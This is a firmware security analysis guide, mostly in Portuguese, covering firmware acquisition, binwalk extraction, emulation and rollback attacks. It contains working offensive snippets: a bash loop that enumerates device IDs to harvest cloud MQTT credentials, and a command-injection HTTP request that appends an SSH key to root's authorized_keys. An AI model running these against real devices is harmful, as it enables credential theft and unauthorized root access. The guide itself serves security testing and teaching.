# Análise de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introdução**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

O firmware é o software essencial que permite que dispositivos funcionem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com que os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo tenha acesso a instruções vitais desde o momento em que é ligado, levando ao carregamento do sistema operacional. Examinar e, potencialmente, modificar o firmware é uma etapa crítica para identificar vulnerabilidades de segurança.

## **Coleta de Informações**

**Coleta de informações** é uma etapa inicial crítica para entender a composição de um dispositivo e as tecnologias que ele usa. Esse processo envolve a obtenção de dados sobre:

- A arquitetura da CPU e o sistema operacional que ele executa
- Especificações do bootloader
- Layout de hardware e datasheets
- Métricas da base de código e localizações das fontes
- Bibliotecas externas e tipos de licença
- Históricos de atualização e certificações regulatórias
- Diagramas de arquitetura e de fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para esse propósito, ferramentas de **open-source intelligence (OSINT)** são inestimáveis, assim como a análise de quaisquer componentes de software open-source disponíveis por meio de revisão manual e automatizada. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser aproveitada para encontrar problemas potenciais.

## **Aquisição do Firmware**

Obter o firmware pode ser feito por vários meios, cada um com seu nível de complexidade:

- **Diretamente** da fonte (desenvolvedores, fabricantes)
- **Construindo** a partir de instruções fornecidas
- **Baixando** de sites de suporte oficiais
- Utilizando consultas **Google dork** para encontrar arquivos de firmware hospedados
- Acessando **cloud storage** diretamente, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** via técnicas de man-in-the-middle
- **Extraindo** do dispositivo através de conexões como **UART**, **JTAG**, ou **PICit**
- **Sniffando** requisições de atualização nas comunicações do dispositivo
- Identificando e usando **hardcoded update endpoints**
- **Dumping** a partir do bootloader ou da rede
- **Removendo e lendo** o chip de armazenamento, quando tudo mais falhar, usando ferramentas de hardware apropriadas

## Analisando o firmware

Agora que você **tem o firmware**, precisa extrair informações sobre ele para saber como tratá-lo. Diferentes ferramentas que você pode usar para isso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se você não encontrar muito com essas ferramentas verifique a **entropia** da imagem com `binwalk -E <bin>`, se a entropia for baixa, então provavelmente não está encriptada. Se a entropia for alta, é provável que esteja encriptada (ou comprimida de alguma forma).

Além disso, você pode usar essas ferramentas para extrair **arquivos embutidos no firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspecionar o arquivo.

### Obtendo o sistema de arquivos

Com as ferramentas comentadas anteriormente como `binwalk -ev <bin>` você deveria ter conseguido **extrair o sistema de arquivos**.\
binwalk geralmente o extrai dentro de uma **pasta nomeada conforme o tipo de sistema de arquivos**, que normalmente é um dos seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extração manual do sistema de arquivos

Às vezes, o binwalk **não terá o magic byte do sistema de arquivos em suas assinaturas**. Nesses casos, use o binwalk para **encontrar o offset do sistema de arquivos e carve o sistema de arquivos comprimido** do binário e **extrair manualmente** o sistema de arquivos de acordo com seu tipo usando os passos abaixo.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Execute o seguinte **dd command** para extrair o Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, o seguinte comando também pode ser executado.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos estarão no diretório `squashfs-root` após a extração.

- Para arquivos CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de arquivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de arquivos ubifs em NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando Firmware

Uma vez obtido o firmware, é essencial dissecá-lo para entender sua estrutura e possíveis vulnerabilidades. Esse processo envolve utilizar várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de Análise Inicial

Abaixo há um conjunto de comandos para inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e entender detalhes de partições e sistemas de arquivos:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para avaliar o estado de criptografia da imagem, verifica-se a **entropia** com `binwalk -E <bin>`. Entropia baixa sugere ausência de criptografia, enquanto entropia alta indica possível criptografia ou compressão.

Para extrair **embedded files**, recomendam-se ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e **binvis.io** para inspeção de arquivos.

### Extraindo o sistema de arquivos

Usando `binwalk -ev <bin>`, normalmente é possível extrair o sistema de arquivos, frequentemente para um diretório nomeado pelo tipo de sistema de arquivos (por exemplo, squashfs, ubifs). No entanto, quando o **binwalk** não consegue reconhecer o tipo de sistema de arquivos devido à ausência dos magic bytes, é necessária a extração manual. Isso envolve usar o `binwalk` para localizar o offset do sistema de arquivos, seguido do comando `dd` para extrair o sistema de arquivos:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Depois, dependendo do tipo de sistema de arquivos (por exemplo, squashfs, cpio, jffs2, ubifs), comandos diferentes são usados para extrair manualmente o conteúdo.

### Filesystem Analysis

Com o sistema de arquivos extraído, começa a busca por falhas de segurança. Atenção é dada a daemons de rede inseguros, credenciais hardcoded, endpoints de API, funcionalidades de update server, código não compilado, scripts de inicialização e binários compilados para análise offline.

**Key locations** e **items** a inspecionar incluem:

- **etc/shadow** e **etc/passwd** para credenciais de usuários
- SSL certificates and keys em **etc/ssl**
- Arquivos de configuração e scripts em busca de potenciais vulnerabilidades
- Binários embarcados para análise adicional
- Web servers comuns de dispositivos IoT e binários

Várias ferramentas ajudam a descobrir informação sensível e vulnerabilidades dentro do filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) para busca de informações sensíveis
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análise abrangente de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), e [**EMBA**](https://github.com/e-m-b-a/emba) para análise estática e dinâmica

### Security Checks on Compiled Binaries

Tanto o código fonte quanto os binários compilados encontrados no filesystem devem ser escrutinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binários Unix e **PESecurity** para binários Windows ajudam a identificar binários desprotegidos que podem ser explorados.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Many IoT hubs fetch their per-device configuration from a cloud endpoint that looks like:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

During firmware analysis you may find that <token> is derived locally from the device ID using a hardcoded secret, for example:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

This design enables anyone who learns a deviceId and the STATIC_KEY to reconstruct the URL and pull cloud config, often revealing plaintext MQTT credentials and topic prefixes.

Practical workflow:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Procure por linhas que imprimam o padrão de URL do cloud config e o endereço do broker, por exemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY e algoritmo do token a partir do firmware

- Carregue os binários no Ghidra/radare2 e procure pelo caminho de configuração ("/pf/") ou pelo uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Derive o token em Bash e converta o digest para maiúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Coletar cloud config e credenciais MQTT

- Monte a URL e baixe o JSON com curl; analise com jq para extrair segredos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusar de MQTT em texto simples e ACLs fracas de tópicos (se presentes)

- Use credenciais recuperadas para assinar tópicos de manutenção e procurar por eventos sensíveis:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivo previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam bytes OUI do fornecedor/produto/tipo seguidos por um sufixo sequencial.
- Você pode iterar IDs candidatos, derivar tokens e recuperar configs programaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Sempre obtenha autorização explícita antes de tentar mass enumeration.
- Prefira emulation ou static analysis para recuperar segredos sem modificar o hardware alvo quando possível.

O processo de emulating firmware habilita **dynamic analysis** tanto da operação de um dispositivo quanto de um programa individual. Essa abordagem pode encontrar desafios devido a dependências de hardware ou arquitetura, mas transferir o root filesystem ou binários específicos para um dispositivo com arquitetura e endianness correspondentes, como um Raspberry Pi, ou para uma virtual machine pré-construída, pode facilitar testes adicionais.

### Emulating Individual Binaries

Para examinar programas individuais, identificar o endianness e a CPU architecture do programa é crucial.

#### Example with MIPS Architecture

To emulate a MIPS architecture binary, one can use the command:
```bash
file ./squashfs-root/bin/busybox
```
E para instalar as ferramentas de emulação necessárias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), `qemu-mips` é usado, e para binários little-endian, `qemu-mipsel` seria a escolha.

#### Emulação da Arquitetura ARM

Para binários ARM, o processo é semelhante, utilizando-se o emulador `qemu-arm` para emulação.

### Emulação de Sistema Completo

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), e outras, facilitam a emulação completa de firmware, automatizando o processo e auxiliando na análise dinâmica.

## Análise Dinâmica na Prática

Neste estágio, usa-se um ambiente de dispositivo real ou emulado para análise. É essencial manter acesso a shell ao OS e ao sistema de arquivos. A emulação pode não reproduzir perfeitamente as interações com o hardware, exigindo reinicializações ocasionais da emulação. A análise deve revisitar o sistema de arquivos, explorar páginas web e serviços de rede expostos e investigar vulnerabilidades do bootloader. Testes de integridade do firmware são críticos para identificar potenciais backdoors.

## Técnicas de Análise em Tempo de Execução

A análise em tempo de execução envolve interagir com um processo ou binário em seu ambiente operacional, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilidades através de fuzzing e outras técnicas.

## Exploração de Binários e Prova de Conceito

Desenvolver um PoC para vulnerabilidades identificadas exige um entendimento profundo da arquitetura alvo e programação em linguagens de baixo nível. Proteções em tempo de execução para binários em sistemas embarcados são raras, mas quando presentes, técnicas como Return Oriented Programming (ROP) podem ser necessárias.

## Sistemas Operacionais Preparados para Análise de Firmware

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) fornecem ambientes pré-configurados para testes de segurança de firmware, equipados com as ferramentas necessárias.

## Sistemas Operacionais Preparados para Analisar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distro destinada a ajudar você a realizar avaliação de segurança e testes de penetração em dispositivos Internet das Coisas (IoT). Economiza muito tempo fornecendo um ambiente pré-configurado com todas as ferramentas necessárias.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operacional para testes de segurança embarcada baseado em Ubuntu 18.04, pré-carregado com ferramentas para testes de segurança de firmware.

## Ataques de Rebaixamento de Firmware e Mecanismos de Atualização Inseguros

Mesmo quando um fornecedor implementa verificações de assinatura criptográfica para imagens de firmware, **a proteção contra rollback de versão (downgrade) é frequentemente omitida**. Quando o boot- ou recovery-loader apenas verifica a assinatura com uma chave pública embutida mas não compara a *versão* (ou um contador monótono) da imagem que está sendo gravada, um atacante pode legitimamente instalar um **firmware mais antigo e vulnerável que ainda possui uma assinatura válida** e assim reintroduzir vulnerabilidades corrigidas.

Fluxo típico de ataque:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Exemplo: Command Injection Após o Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
No firmware vulnerável (downgraded), o parâmetro `md5` é concatenado diretamente em um shell command sem sanitização, permitindo a injeção de comandos arbitrários (aqui – habilitando SSH key-based root access). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de proteção contra downgrade torna a correção inútil.

### Extraindo Firmware de Apps Móveis

Muitos fornecedores empacotam imagens completas do firmware dentro de seus aplicativos móveis companheiros para que o app possa atualizar o dispositivo via Bluetooth/Wi-Fi. Esses pacotes costumam ser armazenados não criptografados no APK/APEX em caminhos como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra`, ou até mesmo o simples `unzip` permitem extrair imagens assinadas sem tocar no hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist para Avaliar a Lógica de Atualização

* O transporte/autenticação do *endpoint de atualização* está adequadamente protegido (TLS + autenticação)?
* O dispositivo compara **números de versão** ou um **contador monotônico anti-rollback** antes de gravar a imagem?
* A imagem é verificada dentro de uma cadeia de boot segura (por exemplo, assinaturas verificadas pelo código ROM)?
* O código userland realiza verificações adicionais de sanidade (por exemplo, mapa de partições permitido, número do modelo)?
* Fluxos de atualização *parcial* ou *backup* estão reutilizando a mesma lógica de validação?

> 💡  Se qualquer um dos itens acima estiver faltando, a plataforma provavelmente é vulnerável a ataques de rollback.

## Firmwares vulneráveis para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulnerável como ponto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referências

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Treinamento e Certificação

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
